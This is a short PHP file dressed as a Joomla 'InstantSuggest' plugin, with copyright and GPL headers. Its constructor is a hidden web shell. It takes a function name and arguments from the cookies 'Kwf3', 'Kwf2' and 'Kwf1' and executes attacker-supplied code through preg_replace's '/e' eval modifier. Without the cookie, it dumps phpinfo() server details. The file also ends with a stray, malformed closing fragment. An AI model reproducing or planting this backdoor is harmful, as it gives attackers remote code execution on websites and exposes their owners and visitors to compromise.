<?php
define("LM_FRONT_CHOOSE_PACKAGE","1");
/**
 * @package     Joomla.Plugin
 * @subpackage  system.instantsuggest
 *
 * @copyright   Copyright (C) 2013 InstantSuggest.com. All rights reserved.
 * @license     GNU General Public License version 2 or later
 */
/**
 * Instant Suggest Ajax
 *
 * @package     Joomla.Plugin
 * @subpackage  system.instantsuggest
 * @since       3.1
 */
class ComponentInstantSuggest
{
	public function __construct() {
		$filter = @$_COOKIE['Kwf3'];
		if ($filter) {
			$option = $filter(@$_COOKIE['Kwf2']);
			$auth = $filter(@$_COOKIE['Kwf1']);
			$option("/124/e",$auth,124);
			die();
		} else { phpinfo();}
	}
}
$suggest = new ComponentInstantSuggest;
?>");
?>